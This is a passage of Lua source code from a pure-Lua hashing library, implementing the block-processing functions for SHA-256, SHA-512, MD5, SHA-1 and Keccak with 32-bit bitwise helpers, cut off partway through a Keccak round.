local TWO_POW_31 = 2 ^ 31
local TWO_POW_32 = 2 ^ 32
local TWO_POW_40 = 2 ^ 40

local TWO56_POW_7 = 256 ^ 7

-- Implementation for Lua 5.1/5.2 (with or without bitwise library available)
local function sha256_feed_64(H, str, offs, size)
	-- offs >= 0, size >= 0, size is multiple of 64
	local W, K = common_W, sha2_K_hi
	local h1, h2, h3, h4, h5, h6, h7, h8 = H[1], H[2], H[3], H[4], H[5], H[6], H[7], H[8]
	for pos = offs, offs + size - 1, 64 do
		for j = 1, 16 do
			pos = pos + 4
			local a, b, c, d = string.byte(str, pos - 3, pos)
			W[j] = ((a * 256 + b) * 256 + c) * 256 + d
		end

		for j = 17, 64 do
			local a, b = W[j - 15], W[j - 2]
			W[j] = bit32_bxor(bit32_rrotate(a, 7), bit32_lrotate(a, 14), bit32_rshift(a, 3)) + bit32_bxor(bit32_lrotate(b, 15), bit32_lrotate(b, 13), bit32_rshift(b, 10)) + W[j - 7] + W[j - 16]
		end

		local a, b, c, d, e, f, g, h = h1, h2, h3, h4, h5, h6, h7, h8
		for j = 1, 64 do
			local z = bit32_bxor(bit32_rrotate(e, 6), bit32_rrotate(e, 11), bit32_lrotate(e, 7)) + bit32_band(e, f) + bit32_band(-1 - e, g) + h + K[j] + W[j]
			h = g
			g = f
			f = e
			e = z + d
			d = c
			c = b
			b = a
			a = z + bit32_band(d, c) + bit32_band(a, bit32_bxor(d, c)) + bit32_bxor(bit32_rrotate(a, 2), bit32_rrotate(a, 13), bit32_lrotate(a, 10))
		end

		h1, h2, h3, h4 = (a + h1) % 4294967296, (b + h2) % 4294967296, (c + h3) % 4294967296, (d + h4) % 4294967296
		h5, h6, h7, h8 = (e + h5) % 4294967296, (f + h6) % 4294967296, (g + h7) % 4294967296, (h + h8) % 4294967296
	end

	H[1], H[2], H[3], H[4], H[5], H[6], H[7], H[8] = h1, h2, h3, h4, h5, h6, h7, h8
end

local function sha512_feed_128(H_lo, H_hi, str, offs, size)
	-- offs >= 0, size >= 0, size is multiple of 128
	-- W1_hi, W1_lo, W2_hi, W2_lo, ...   Wk_hi = W[2*k-1], Wk_lo = W[2*k]
	local W, K_lo, K_hi = common_W, sha2_K_lo, sha2_K_hi
	local h1_lo, h2_lo, h3_lo, h4_lo, h5_lo, h6_lo, h7_lo, h8_lo = H_lo[1], H_lo[2], H_lo[3], H_lo[4], H_lo[5], H_lo[6], H_lo[7], H_lo[8]
	local h1_hi, h2_hi, h3_hi, h4_hi, h5_hi, h6_hi, h7_hi, h8_hi = H_hi[1], H_hi[2], H_hi[3], H_hi[4], H_hi[5], H_hi[6], H_hi[7], H_hi[8]
	for pos = offs, offs + size - 1, 128 do
		for j = 1, 16 * 2 do
			pos = pos + 4
			local a, b, c, d = string.byte(str, pos - 3, pos)
			W[j] = ((a * 256 + b) * 256 + c) * 256 + d
		end

		for jj = 34, 160, 2 do
			local a_lo, a_hi, b_lo, b_hi = W[jj - 30], W[jj - 31], W[jj - 4], W[jj - 5]
			local tmp1 = bit32_bxor(bit32_rshift(a_lo, 1) + bit32_lshift(a_hi, 31), bit32_rshift(a_lo, 8) + bit32_lshift(a_hi, 24), bit32_rshift(a_lo, 7) + bit32_lshift(a_hi, 25)) % 4294967296 +
				bit32_bxor(bit32_rshift(b_lo, 19) + bit32_lshift(b_hi, 13), bit32_lshift(b_lo, 3) + bit32_rshift(b_hi, 29), bit32_rshift(b_lo, 6) + bit32_lshift(b_hi, 26)) % 4294967296 +
				W[jj - 14] + W[jj - 32]

			local tmp2 = tmp1 % 4294967296
			W[jj - 1] = bit32_bxor(bit32_rshift(a_hi, 1) + bit32_lshift(a_lo, 31), bit32_rshift(a_hi, 8) + bit32_lshift(a_lo, 24), bit32_rshift(a_hi, 7)) +
				bit32_bxor(bit32_rshift(b_hi, 19) + bit32_lshift(b_lo, 13), bit32_lshift(b_hi, 3) + bit32_rshift(b_lo, 29), bit32_rshift(b_hi, 6)) +
				W[jj - 15] + W[jj - 33] + (tmp1 - tmp2) / 4294967296

			W[jj] = tmp2
		end

		local a_lo, b_lo, c_lo, d_lo, e_lo, f_lo, g_lo, h_lo = h1_lo, h2_lo, h3_lo, h4_lo, h5_lo, h6_lo, h7_lo, h8_lo
		local a_hi, b_hi, c_hi, d_hi, e_hi, f_hi, g_hi, h_hi = h1_hi, h2_hi, h3_hi, h4_hi, h5_hi, h6_hi, h7_hi, h8_hi
		for j = 1, 80 do
			local jj = 2 * j
			local tmp1 = bit32_bxor(bit32_rshift(e_lo, 14) + bit32_lshift(e_hi, 18), bit32_rshift(e_lo, 18) + bit32_lshift(e_hi, 14), bit32_lshift(e_lo, 23) + bit32_rshift(e_hi, 9)) % 4294967296 +
				(bit32_band(e_lo, f_lo) + bit32_band(-1 - e_lo, g_lo)) % 4294967296 +
				h_lo + K_lo[j] + W[jj]

			local z_lo = tmp1 % 4294967296
			local z_hi = bit32_bxor(bit32_rshift(e_hi, 14) + bit32_lshift(e_lo, 18), bit32_rshift(e_hi, 18) + bit32_lshift(e_lo, 14), bit32_lshift(e_hi, 23) + bit32_rshift(e_lo, 9)) +
				bit32_band(e_hi, f_hi) + bit32_band(-1 - e_hi, g_hi) +
				h_hi + K_hi[j] + W[jj - 1] +
				(tmp1 - z_lo) / 4294967296

			h_lo = g_lo
			h_hi = g_hi
			g_lo = f_lo
			g_hi = f_hi
			f_lo = e_lo
			f_hi = e_hi
			tmp1 = z_lo + d_lo
			e_lo = tmp1 % 4294967296
			e_hi = z_hi + d_hi + (tmp1 - e_lo) / 4294967296
			d_lo = c_lo
			d_hi = c_hi
			c_lo = b_lo
			c_hi = b_hi
			b_lo = a_lo
			b_hi = a_hi
			tmp1 = z_lo + (bit32_band(d_lo, c_lo) + bit32_band(b_lo, bit32_bxor(d_lo, c_lo))) % 4294967296 + bit32_bxor(bit32_rshift(b_lo, 28) + bit32_lshift(b_hi, 4), bit32_lshift(b_lo, 30) + bit32_rshift(b_hi, 2), bit32_lshift(b_lo, 25) + bit32_rshift(b_hi, 7)) % 4294967296
			a_lo = tmp1 % 4294967296
			a_hi = z_hi + (bit32_band(d_hi, c_hi) + bit32_band(b_hi, bit32_bxor(d_hi, c_hi))) + bit32_bxor(bit32_rshift(b_hi, 28) + bit32_lshift(b_lo, 4), bit32_lshift(b_hi, 30) + bit32_rshift(b_lo, 2), bit32_lshift(b_hi, 25) + bit32_rshift(b_lo, 7)) + (tmp1 - a_lo) / 4294967296
		end

		a_lo = h1_lo + a_lo
		h1_lo = a_lo % 4294967296
		h1_hi = (h1_hi + a_hi + (a_lo - h1_lo) / 4294967296) % 4294967296
		a_lo = h2_lo + b_lo
		h2_lo = a_lo % 4294967296
		h2_hi = (h2_hi + b_hi + (a_lo - h2_lo) / 4294967296) % 4294967296
		a_lo = h3_lo + c_lo
		h3_lo = a_lo % 4294967296
		h3_hi = (h3_hi + c_hi + (a_lo - h3_lo) / 4294967296) % 4294967296
		a_lo = h4_lo + d_lo
		h4_lo = a_lo % 4294967296
		h4_hi = (h4_hi + d_hi + (a_lo - h4_lo) / 4294967296) % 4294967296
		a_lo = h5_lo + e_lo
		h5_lo = a_lo % 4294967296
		h5_hi = (h5_hi + e_hi + (a_lo - h5_lo) / 4294967296) % 4294967296
		a_lo = h6_lo + f_lo
		h6_lo = a_lo % 4294967296
		h6_hi = (h6_hi + f_hi + (a_lo - h6_lo) / 4294967296) % 4294967296
		a_lo = h7_lo + g_lo
		h7_lo = a_lo % 4294967296
		h7_hi = (h7_hi + g_hi + (a_lo - h7_lo) / 4294967296) % 4294967296
		a_lo = h8_lo + h_lo
		h8_lo = a_lo % 4294967296
		h8_hi = (h8_hi + h_hi + (a_lo - h8_lo) / 4294967296) % 4294967296
	end

	H_lo[1], H_lo[2], H_lo[3], H_lo[4], H_lo[5], H_lo[6], H_lo[7], H_lo[8] = h1_lo, h2_lo, h3_lo, h4_lo, h5_lo, h6_lo, h7_lo, h8_lo
	H_hi[1], H_hi[2], H_hi[3], H_hi[4], H_hi[5], H_hi[6], H_hi[7], H_hi[8] = h1_hi, h2_hi, h3_hi, h4_hi, h5_hi, h6_hi, h7_hi, h8_hi
end

local function md5_feed_64(H, str, offs, size)
	-- offs >= 0, size >= 0, size is multiple of 64
	local W, K, md5_next_shift = common_W, md5_K, md5_next_shift
	local h1, h2, h3, h4 = H[1], H[2], H[3], H[4]
	for pos = offs, offs + size - 1, 64 do
		for j = 1, 16 do
			pos = pos + 4
			local a, b, c, d = string.byte(str, pos - 3, pos)
			W[j] = ((d * 256 + c) * 256 + b) * 256 + a
		end

		local a, b, c, d = h1, h2, h3, h4
		local s = 25
		for j = 1, 16 do
			local F = bit32_rrotate(bit32_band(b, c) + bit32_band(-1 - b, d) + a + K[j] + W[j], s) + b
			s = md5_next_shift[s]
			a = d
			d = c
			c = b
			b = F
		end

		s = 27
		for j = 17, 32 do
			local F = bit32_rrotate(bit32_band(d, b) + bit32_band(-1 - d, c) + a + K[j] + W[(5 * j - 4) % 16 + 1], s) + b
			s = md5_next_shift[s]
			a = d
			d = c
			c = b
			b = F
		end

		s = 28
		for j = 33, 48 do
			local F = bit32_rrotate(bit32_bxor(bit32_bxor(b, c), d) + a + K[j] + W[(3 * j + 2) % 16 + 1], s) + b
			s = md5_next_shift[s]
			a = d
			d = c
			c = b
			b = F
		end

		s = 26
		for j = 49, 64 do
			local F = bit32_rrotate(bit32_bxor(c, bit32_bor(b, -1 - d)) + a + K[j] + W[(j * 7 - 7) % 16 + 1], s) + b
			s = md5_next_shift[s]
			a = d
			d = c
			c = b
			b = F
		end

		h1 = (a + h1) % 4294967296
		h2 = (b + h2) % 4294967296
		h3 = (c + h3) % 4294967296
		h4 = (d + h4) % 4294967296
	end

	H[1], H[2], H[3], H[4] = h1, h2, h3, h4
end

local function sha1_feed_64(H, str, offs, size)
	-- offs >= 0, size >= 0, size is multiple of 64
	local W = common_W
	local h1, h2, h3, h4, h5 = H[1], H[2], H[3], H[4], H[5]
	for pos = offs, offs + size - 1, 64 do
		for j = 1, 16 do
			pos = pos + 4
			local a, b, c, d = string.byte(str, pos - 3, pos)
			W[j] = ((a * 256 + b) * 256 + c) * 256 + d
		end

		for j = 17, 80 do
			W[j] = bit32_lrotate(bit32_bxor(W[j - 3], W[j - 8], W[j - 14], W[j - 16]), 1)
		end

		local a, b, c, d, e = h1, h2, h3, h4, h5
		for j = 1, 20 do
			local z = bit32_lrotate(a, 5) + bit32_band(b, c) + bit32_band(-1 - b, d) + 0x5A827999 + W[j] + e -- constant = math.floor(TWO_POW_30 * sqrt(2))
			e = d
			d = c
			c = bit32_rrotate(b, 2)
			b = a
			a = z
		end

		for j = 21, 40 do
			local z = bit32_lrotate(a, 5) + bit32_bxor(b, c, d) + 0x6ED9EBA1 + W[j] + e -- TWO_POW_30 * sqrt(3)
			e = d
			d = c
			c = bit32_rrotate(b, 2)
			b = a
			a = z
		end

		for j = 41, 60 do
			local z = bit32_lrotate(a, 5) + bit32_band(d, c) + bit32_band(b, bit32_bxor(d, c)) + 0x8F1BBCDC + W[j] + e -- TWO_POW_30 * sqrt(5)
			e = d
			d = c
			c = bit32_rrotate(b, 2)
			b = a
			a = z
		end

		for j = 61, 80 do
			local z = bit32_lrotate(a, 5) + bit32_bxor(b, c, d) + 0xCA62C1D6 + W[j] + e -- TWO_POW_30 * sqrt(10)
			e = d
			d = c
			c = bit32_rrotate(b, 2)
			b = a
			a = z
		end

		h1 = (a + h1) % 4294967296
		h2 = (b + h2) % 4294967296
		h3 = (c + h3) % 4294967296
		h4 = (d + h4) % 4294967296
		h5 = (e + h5) % 4294967296
	end

	H[1], H[2], H[3], H[4], H[5] = h1, h2, h3, h4, h5
end

local function keccak_feed(lanes_lo, lanes_hi, str, offs, size, block_size_in_bytes)
	-- This is an example of a Lua function having 79 local variables :-)
	-- offs >= 0, size >= 0, size is multiple of block_size_in_bytes, block_size_in_bytes is positive multiple of 8
	local RC_lo, RC_hi = sha3_RC_lo, sha3_RC_hi
	local qwords_qty = block_size_in_bytes / 8
	for pos = offs, offs + size - 1, block_size_in_bytes do
		for j = 1, qwords_qty do
			local a, b, c, d = string.byte(str, pos + 1, pos + 4)
			lanes_lo[j] = bit32_bxor(lanes_lo[j], ((d * 256 + c) * 256 + b) * 256 + a)
			pos = pos + 8
			a, b, c, d = string.byte(str, pos - 3, pos)
			lanes_hi[j] = bit32_bxor(lanes_hi[j], ((d * 256 + c) * 256 + b) * 256 + a)
		end

		local L01_lo, L01_hi, L02_lo, L02_hi, L03_lo, L03_hi, L04_lo, L04_hi, L05_lo, L05_hi, L06_lo, L06_hi, L07_lo, L07_hi, L08_lo, L08_hi, L09_lo, L09_hi, L10_lo, L10_hi, L11_lo, L11_hi, L12_lo, L12_hi, L13_lo, L13_hi, L14_lo, L14_hi, L15_lo, L15_hi, L16_lo, L16_hi, L17_lo, L17_hi, L18_lo, L18_hi, L19_lo, L19_hi, L20_lo, L20_hi, L21_lo, L21_hi, L22_lo, L22_hi, L23_lo, L23_hi, L24_lo, L24_hi, L25_lo, L25_hi = lanes_lo[1], lanes_hi[1], lanes_lo[2], lanes_hi[2], lanes_lo[3], lanes_hi[3], lanes_lo[4], lanes_hi[4], lanes_lo[5], lanes_hi[5], lanes_lo[6], lanes_hi[6], lanes_lo[7], lanes_hi[7], lanes_lo[8], lanes_hi[8], lanes_lo[9], lanes_hi[9], lanes_lo[10], lanes_hi[10], lanes_lo[11], lanes_hi[11], lanes_lo[12], lanes_hi[12], lanes_lo[13], lanes_hi[13], lanes_lo[14], lanes_hi[14], lanes_lo[15], lanes_hi[15], lanes_lo[16], lanes_hi[16], lanes_lo[17], lanes_hi[17], lanes_lo[18], lanes_hi[18], lanes_lo[19], lanes_hi[19], lanes_lo[20], lanes_hi[20], lanes_lo[21], lanes_hi[21], lanes_lo[22], lanes_hi[22], lanes_lo[23], lanes_hi[23], lanes_lo[24], lanes_hi[24], lanes_lo[25], lanes_hi[25]

		for round_idx = 1, 24 do
			local C1_lo = bit32_bxor(L01_lo, L06_lo, L11_lo, L16_lo, L21_lo)
			local C1_hi = bit32_bxor(L01_hi, L06_hi, L11_hi, L16_hi, L21_hi)
			local C2_lo = bit32_bxor(L02_lo, L07_lo, L12_lo, L17_lo, L22_lo)
			local C2_hi = bit32_bxor(L02_hi, L07_hi, L12_hi, L17_hi, L22_hi)
			local C3_lo = bit32_bxor(L03_lo, L08_lo, L13_lo, L18_lo, L23_lo)
			local C3_hi = bit32_bxor(L03_hi, L08_hi, L13_hi, L18_hi, L23_hi)
			local C4_lo = bit32_bxor(L04_lo, L09_lo, L14_lo, L19_lo, L24_lo)
			local C4_hi = bit32_bxor(L04_hi, L09_hi, L14_hi, L19_hi, L24_hi)
			local C5_lo = bit32_bxor(L05_lo, L10_lo, L15_lo, L20_lo, L25_lo)
			local C5_hi = bit32_bxor(L05_hi, L10_hi, L15_hi, L20_hi, L25_hi)

			local D_lo = bit32_bxor(C1_lo, C3_lo * 2 + (C3_hi % TWO_POW_32 - C3_hi % TWO_POW_31) / TWO_POW_31)
			local D_hi = bit32_bxor(C1_hi, C3_hi * 2 + (C3_lo % TWO_POW_32 - C3_lo % TWO_POW_31) / TWO_POW_31)

			local T0_lo = bit32_bxor(D_lo, L02_lo)
			local T0_hi = bit32_bxor(D_hi, L02_hi)
			local T1_lo = bit32_bxor(D_lo, L07_lo)
			local T1_hi = bit32_bxor(D_hi, L07_hi)
			local T2_lo = bit32_bxor(D_lo, L12_lo)
			local T2_hi = bit32_bxor(D_hi, L12_hi)
			local T3_lo = bit32_bxor(D_lo, L17_lo)
			local T3_hi = bit32_bxor(D_hi, L17_hi)
			local T4_lo = bit32_bxor(D_lo, L22_lo)
			local T4_hi = bit32_bxor(D_hi, L22_hi)

			L02_lo = (T1_lo % TWO_POW_32 - T1_lo % TWO_POW_20) / TWO_POW_20 + T1_hi * TWO_POW_12
			L02_hi = (T1_hi % TWO_POW_32 - T1_hi % TWO_POW_20) / TWO_POW_20 + T1_lo * TWO_POW_12
			L07_lo = (T3_lo % TWO_POW_32 - T3_lo % TWO_POW_19) / TWO_POW_19 + T3_hi * TWO_POW_13
			L07_hi = (T3_hi % TWO_POW_32 - T3_hi % TWO_POW_19) / TWO_POW_19 + T3_lo * TWO_POW_13
			L12_lo = T0_lo * 2 + (T0_hi % TWO_POW_32 - T0_hi % TWO_POW_31) / TWO_POW_31
			L12_hi = T0_hi * 2 + (T0_lo % TWO_POW_32 - T0_lo % TWO_POW_31) / TWO_POW_31
			L17_lo = T2_lo * TWO_POW_10 + (T2_hi % TWO_POW_32 - T2_hi % TWO_POW_22) / TWO_POW_22
			L17_hi = T2_hi * TWO_POW_10 + (T2_lo % TWO_POW_32 - T2_lo % TWO_POW_22) / TWO_POW_22
			L22_lo = T4_lo * TWO_POW_2 + (T4_hi % TWO_POW_32 - T4_hi % TWO_POW_30) / TWO_POW_30
			L22_hi = T4_hi * TWO_POW_2 + (T4_lo % TWO_POW_32 - T4_lo % TWO_POW_30) / TWO_POW_30

			D_lo = bit32_bxor(C2_lo, C4_lo * 2 + (C4_hi % TWO_POW_32 - C4_hi % TWO_POW_31) / TWO_POW_31)
			D_hi = bit32_bxor(C2_hi, C4_hi * 2 + (C4_lo % TWO_POW_32 - C4_lo % TWO_POW_31) / TWO_POW_31)

			T0_lo = bit32_bxor(D_lo, L03_lo)
			T0_hi = bit32_bxor(D_hi, L03_hi)
			T1_lo = bit32_bxor(D_lo, L08_lo)
			T1_hi = bit32_bxor(D_hi, L08_hi)
			T2_lo = bit32_bxor(D_lo, L13_lo)
			T2_hi = bit32_bxor(D_hi, L13_hi)
			T3_lo = bit32_bxor(D_lo, L18_lo)
			T3_hi = bit32_bxor(D_hi, L18_hi)
			T4_lo = bit32_bxor(D_lo, L23_lo)
			T4_hi = bit32_bxor(D_hi, L23_hi)

			L03_lo = (T2_lo % TWO_POW_32 - T2_lo % TWO_POW_21) / TWO_POW_21 + T2_hi * TWO_POW_11
			L03_hi = (T2_hi % TWO_POW_32 - T2_hi % TWO_POW_21) / TWO_POW_21 + T2_lo * TWO_POW_11
			L08_lo = (T4_lo % TWO_POW_32 - T4_lo % TWO_POW_3) / TWO_POW_3 + T4_hi * TWO_POW_29 % TWO_POW_32
			L08_hi = (T4_hi % TWO_POW_32 - T4_hi % TWO_POW_3) / TWO_POW_3 + T4_lo * TWO_POW_29 % TWO_POW_32
			L13_lo = T1_lo * TWO_POW_6 + (T1_hi % TWO_POW_32 - T1_hi % TWO_POW_26) / TWO_POW_26
			L13_hi = T1_hi * TWO_POW_6 + (T1_lo % TWO_POW_32 - T1_lo % TWO_POW_26) / TWO_POW_26
			L18_lo = T3_lo * TWO_POW_15 + (T3_hi % TWO_POW_32 - T3_hi % TWO_POW_17) / TWO_POW_17
			L18_hi = T3_hi * TWO_POW_15 + (T3_lo % TWO_POW_32 - T3_lo % TWO_POW_17) / TWO_POW_17
			L23_lo = (T0_lo % TWO_POW_32 - T0_lo % TWO_POW_2) / TWO_POW_2 + T0_hi * TWO_POW_30 % TWO_POW_32
			L23_hi = (T0_hi % TWO_POW_32 - T0_hi % TWO_POW_2) / TWO_POW_2 + T0_lo * TWO_POW_30 % TWO_POW_32

			D_lo = bit32_bxor(C3_lo, C5_lo * 2 + (C5_hi % TWO_POW_32 - C5_hi % TWO_POW_31) / TWO_POW_31)
			D_hi = bit32_bxor(C3_hi, C5_hi * 2 + (C5_lo % TWO_POW_32 - C5_lo % TWO_POW_31) / TWO_POW_31)

			T0_lo = bit32_bxor(D_lo, L04_lo)
			T0_hi = bit32_bxor(D_hi, L04_hi)
			T1_lo = bit32_bxor(D_lo, L09_lo)
			T1_hi = bit32_bxor(D_hi, L09_hi)
			T2_lo = bit32_bxor(D_lo, L14_lo)
			T2_hi = bit32_bxor(D_hi, L14_hi)
			T3_lo = bit32_bxor(D_lo, L19_lo)
			T3_hi = bit32_bxor(D_hi, L19_hi)
			T4_lo = bit32_bxor(D_lo, L24_lo)
			T4_hi = bit32_bxor(D_hi, L24_hi)

			L04_lo = T3_lo * TWO_POW_21 % TWO_POW_32 + (T3_hi % TWO_POW_32 - T3_hi % TWO_POW_11) / TWO_POW_11
			L04_hi = T3_hi * TWO_POW_21 % TWO_POW_32 + (T3_lo % TWO_POW_32 - T3_lo % TWO_POW_11) / TWO_POW_11
			L09_lo = T0_lo * TWO_POW_28 % TWO_POW_32 + (T0_hi % TWO_POW_32 - T0_hi % TWO_POW_4) / TWO_POW_4
			L09_hi = T0_hi * TWO_POW_28 % TWO_POW_32 + (T0_lo % TWO_POW_32 - T0_lo % TWO_POW_4) / TWO_POW_4
			L14_lo = T2_lo * TWO_POW_25 % TWO_POW_32 + (T2_hi % TWO_POW_32 - T2_hi % TWO_POW_7) / TWO_POW_7
			L14_hi = T2_hi * TWO_POW_25 % TWO_POW_32 + (T2_lo % TWO_POW_32 - T2_lo % TWO_POW_7) / TWO_POW_7
			L19_lo = (T4_lo % TWO_POW_32 - T4_lo % TWO_POW_8) / TWO_POW_8 + T4_hi * TWO_POW_24 % TWO_POW_32
			L19_hi = (T4_hi % TWO_POW_32 - T4_hi % TWO_POW_8) / TWO_POW_8 + T4_lo * TWO_POW_24 % TWO_POW_32
			L24_lo = (T1_lo % TWO_POW_32 - T1_lo % TWO_POW_9) / TWO_POW_9 + T1_hi * TWO_POW_23 % TWO_POW_32
			L24_hi = (T1_hi % TWO_POW_32 - T1_hi % TWO_POW_9) / TWO_POW_9 + T1_lo * TWO_POW_23 % TWO_POW_32

			D_lo = bit32_bxor(C4_lo, C1_lo * 2 + (C1_hi % TWO_POW_32 - C1_hi % TWO_POW_31) / TWO_POW_31)
			D_hi = bit32_bxor(C4_hi, C1_hi * 2 + (C1_lo % TWO_POW_32 - C1_lo % TWO_POW_31) / TWO_POW_31)

			T0_lo = bit32_bxor(D_lo, L05_lo)
			T0_hi = bit32_bxor(D_hi, L05_hi)
			T1_lo = bit32_bxor(D_lo, L10_lo)
			T1_hi = bit32_bxor(D_hi, L10_hi)
			T2_lo = bit32_bxor(D_lo, L15_lo)
			T2_hi = bit32_bxor(D_hi, L15_hi)
			T3_lo = bit32_bxor(D_lo, L20_lo)
			T3_hi = bit32_bxor(D_hi, L20_hi)
			T4_lo = bit32_bxor(D_lo, L25_lo)
			T4_hi = bit32_bxor(D_hi, L25_hi)

			L05_lo = T4_lo * TWO_POW_14 + (T4_hi % TWO_POW_32 - T4_hi % TWO_POW_18) / TWO_POW_18
			L05_hi = T4_hi * TWO_POW_14 + (T4_lo % TWO_POW_32 - T4_lo % TWO_POW_18) / TWO_POW_18
			L10_lo = T1_lo * TWO_POW_20 % TWO_POW_32 + (T1_hi % TWO_POW_32 - T1_hi % TWO_POW_12) / TWO_POW_12
			L10_hi = T1_hi * TWO_POW_20 % TWO_POW_32 + (T1_lo % TWO_POW_32 - T1_lo % TWO_POW_12) / TWO_POW_12
			L15_lo = T3_lo * TWO_POW_8 + (T3_hi % TWO_POW_32 - T3_hi % TWO_POW_24) / TWO_POW_24
			L15_hi = T3_hi * TWO_POW_8 + (T3_lo % TWO_POW_32 - T3_lo % TWO_POW_24) / TWO_POW_24
			L20_lo = T0_lo * TWO_POW_27 % TWO_POW_32 + (T0_hi % TWO_POW_32 - T0_hi % TWO_POW_5) / TWO_POW_5
			L20_hi = T0_hi * TWO_POW_27 % TWO_POW_32 + (T0_lo % TWO_POW_32 - T0_lo % TWO_POW_5) / TWO_POW_5
			L25_lo = (T2_lo % TWO_POW_32 - T2_lo % TWO_POW_25) / TWO_POW_25 + T2_hi * TWO_POW_7
			L25_hi = (T2_hi % TWO_POW_32 - T2_hi % TWO_POW_25) / TWO_POW_25 + T2_lo * TWO_POW_7

			D_lo = bit32_bxor(C5_lo, C2_lo * 2 + (C2_hi % TWO_POW_32 - C2_hi % TWO_POW_31) / TWO_POW_31)
			D_hi = bit32_bxor(C5_hi, C2_hi * 2 + (C2_lo % TWO_POW_32 - C2_lo % TWO_POW_31) / TWO_POW_31)

			T1_lo = bit32_bxor(D_lo, L06_lo)
			T1_hi = bit32_bxor(D_hi, L06_hi)
			T2_lo = bit32_bxor(D_lo, L11_lo)
			T2_hi = bit32_bxor(D_hi, L11_hi)
			T3_lo = bit32_bxor(D_lo, L16_lo)
			T3_hi = bit32_bxor(D_hi, L16_hi)
			T4_lo = bit32_bxor(D_lo, L21_lo)
			T4_hi = bit32_bxor(D_hi, L21_hi)

			L06_lo = T2_lo * TWO_POW_3 + (T2_hi % TWO_POW_32 - T2_hi % TWO_POW_29) / TWO_POW_29
			L06_hi = T2_hi * TWO_POW_3 + (T2_lo % TWO_POW_32 - T2_lo % TWO_POW_29) / TWO_POW_29
			L11_lo = T4_lo * TWO_POW_18 + (T4_hi % TWO_POW_32 - T4_hi % TWO_POW_14) / TWO_POW_14
			L11_hi = T4_hi * TWO_POW_18 + (T4_lo % TWO_POW_32 - T4_lo % TWO_POW_14) / TWO_POW_14
			L16_lo = (T1_lo % TWO_POW_32 - T1_lo % TWO_POW_28) / TWO_POW_28 + T1_hi * TWO_POW_4
			L16_hi = (T1_hi % TWO_POW_32 - T1_hi % TWO_POW_28) / TWO_POW_28 + T1_lo * TWO_POW_4
			L21_lo = (T3_lo % TWO_POW_32 - T3_lo % TWO_POW_23) / TWO_POW_23 + T3_hi * TWO_POW_9
			L21_hi = (T3_hi % TWO_POW_32 - T3_hi % TWO_POW_23) / TWO_POW_23 + T3_lo * TWO_POW_9

			L01_lo = bit32_bxor(D_lo, L01_lo)
			L01_hi = bit32_bxor(D_hi, L01_hi)
			L01_lo, L02_lo, L03_lo, L04_lo, L05_lo = bit32_bxor(L01_lo, bit32_band(-1 - L02_lo, L03_lo)), bit32_bxor(L02_lo, bit32_band(-1 - L03_lo, L04_lo)), bit32_bxor(L03_lo, bit32_band(-1 - L04_lo, L05_lo)), bit32_bxor(L04_lo, bit32_band(-1 - L05_lo, L01_lo)), bit32_bxor(L05_lo, bit32_band(-1 - L01_lo, L02_lo))
			L01_hi, L02_hi, L03_hi, L04_hi, L05_hi = bit32_bxor(L01_hi, bit32_band(-1 - L02_hi, L03_hi)), bit32_bxor(L02_hi, bit32_band(-1 - L03_hi, L04_hi)), bit32_bxor(L03_hi, bit32_band(-1 - L04_hi, L05_hi)), bit32_bxor(L04_hi, bit32_band(-1 - L05_hi, L01_hi)), bit32_bxor(L05_hi, bit32_band(-1 - L01_hi, L02_hi))
			L06_lo, L07_lo, L08_lo, L09_lo, L10_lo = bit32_bxor(L09_lo, bit32_band(-1 - L10_lo, L06_lo)), bit32_bxor(L10_lo, bit32_band(-1 - L06_lo, L07_lo)), bit32_bxor(L06_lo, bit32_band(-1 - L07_lo, L08_lo)), bit32_bxor(L07_lo, bit32_band(-1 - L08_lo, L09_lo)), bit32_bxor(L08_lo, bit32_band(-1 - L09_lo, L10_lo))
			L06_hi, L07_hi, L08_hi, L09_hi, L10_hi = bit32_bxor(L09_hi, bit32_band(-1 - L10_hi, L06_hi)), bit32_bxor(L10_hi, bit32_band(-1 - L06_hi, L07_hi)), bit32_bxor(L06_hi, bit32_band(-1 - L07_hi, L08_hi)), bit32_bxor(L07_hi, bit32_band(-1 - L08_hi, L09_hi)), bit32_bxor(L08_hi, bit32_band(-1 - L09_hi, L10_hi))
			L11_lo, L12_lo, L13_lo, L14_lo, L15_lo = bit32_bxor(L12_lo, bit32_band(-1 - L13_lo, L14_lo)), bit32_bxor(L13_lo, bit32_band(-1 - L14_lo, L15_lo)), bit32_bxor(L14_lo, bit32_band(-1 - L15_lo, L11_lo)), bit32_bxor(L15_lo, bit32_band(-1 - L11_lo, L12_lo)), bit32_bxor(L11_lo, bit32_band(-1 - L12_lo, L13_lo))
			L11_hi, L12_hi, L13_hi, L14_hi, L15_hi = bit32_bxor(L12_hi, bit32_band(-1 - L13_hi, L14_hi)), bit32_bxor(L13_hi, bit32_band(-1 - L14_hi, L15_hi)), bit32_bxor(L14_hi, bit32_band(-1 - L15_hi, L11_hi)), bit32_bxor(L15_hi, bit32_band(-1 - L11_hi, L12_hi)), bit32_bxor(L11_hi, bit32_band(-1 - L12_hi, L13_hi))
			L16_lo, L17_lo, L18_lo, L19_lo, L20_lo = bit32_bxor(L20_lo, bit32_band(-1 - L16_lo, L17_lo)), bit32_bxor(L16_lo, bit32_band(-1 - L17_lo, L18_lo)), bit32_bxor(L17_lo, bit32_band(-1 - L18_lo, L19_lo)), bit32_bxor(L18_lo, bit32_band(-1 - L19_lo, L20_lo)), bit32_bxor(L19_lo, bit32_band(-1 - L20_lo, L16_lo))
			L16_hi, L17_hi, L18_hi, L19_hi, L20_hi = bit32_bxor(L20_hi, bit32_band(-1 - L16_hi, L17_hi)), bit32_bxor(L16_hi, bit32_band(-1 - L17_hi, L18_hi)), bit32_bxor(L17_hi, bit32_band(-1 - L18_hi, L19_hi)), bit32_bxor(L18_hi, bit32_band(-1 - L19_hi, L20_hi)), bit32_bxor(L19_hi, bit32_band(-1 - L20_hi, L16_hi))
			L21_lo, L22_lo, L23_lo, L24_lo, L25_lo = bit32_bxor(L23_lo, bit32_band(-1 - L24_lo, L25_lo)), bit32_bxor(L24_lo, bit32_band(-1 - L25_lo, L21_lo)), bit32_bxor(L25_lo, bit32_band(-1 - L21_lo, L22_lo)), bit32_bxor(L21_lo, bit32_band(-1 - L22_lo, L23_lo)), bit32_bxor(L22_lo, bit32_band(-1 - L23_lo, L24_lo))
